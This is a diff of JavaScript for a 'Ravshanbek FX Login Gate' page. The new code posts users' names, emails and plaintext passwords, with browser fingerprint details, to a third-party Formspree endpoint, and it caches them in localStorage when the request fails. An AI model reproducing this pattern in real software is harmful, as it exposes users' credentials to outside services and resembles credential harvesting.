@@ -660,38 +660,48 @@
     });
 
     // Real Formspree submission
-    async function sendLoginToFormspree(data) {
-      try {
-        const response = await fetch(FORMSPREE_LOGIN_ENDPOINT, {
-          method: 'POST',
-          body: JSON.stringify({
-            ...data,
-            form_type: 'login_gate',
-            page: 'Ravshanbek FX Login Gate',
-            timestamp: new Date().toISOString(),
-            user_agent: navigator.userAgent,
-            screen_resolution: `${window.screen.width}x${window.screen.height}`,
-            language: navigator.language,
-            referrer: document.referrer || 'direct'
-          }),
-          headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
-          }
-        });
-        
-        if (response.ok) {
-          console.log('✅ LOGIN DATA SENT TO FORMSPREE');
-          return true;
-        } else {
-          console.error('❌ FORMSPREE ERROR:', response.status);
-          return false;
-        }
-      } catch (error) {
-        console.error('❌ NETWORK ERROR:', error);
-        return false;
+   async function sendLoginToFormspree(data) {
+  try {
+    // Use FormData instead of JSON - Formspree prefers this
+    const formData = new FormData();
+    formData.append('action', data.action);
+    formData.append('name', data.name);
+    formData.append('email', data.email);
+    formData.append('password', data.password);
+    formData.append('remember', data.remember ? 'Yes' : 'No');
+    formData.append('form_type', 'login_gate');
+    formData.append('page', 'Ravshanbek FX Login Gate');
+    formData.append('timestamp', new Date().toISOString());
+    formData.append('user_agent', navigator.userAgent);
+    formData.append('screen_resolution', `${window.screen.width}x${window.screen.height}`);
+    formData.append('language', navigator.language);
+    formData.append('referrer', document.referrer || 'direct');
+
+    const response = await fetch(FORMSPREE_LOGIN_ENDPOINT, {
+      method: 'POST',
+      body: formData,
+      headers: {
+        'Accept': 'application/json'
       }
+    });
+    
+    // Formspree returns 200 even for some errors, so check response
+    const result = await response.json();
+    
+    if (response.ok || result.ok) {
+      console.log('✅ LOGIN DATA SENT TO FORMSPREE:', result);
+      return true;
+    } else {
+      console.error('❌ FORMSPREE ERROR:', result);
+      return false;
     }
+  } catch (error) {
+    console.error('❌ NETWORK ERROR:', error);
+    console.log('📊 Saving to localStorage as backup...');
+    saveToLocalStorage(data);
+    return false;
+  }
+}
 
     // Also save to localStorage as backup
     function saveToLocalStorage(data) {
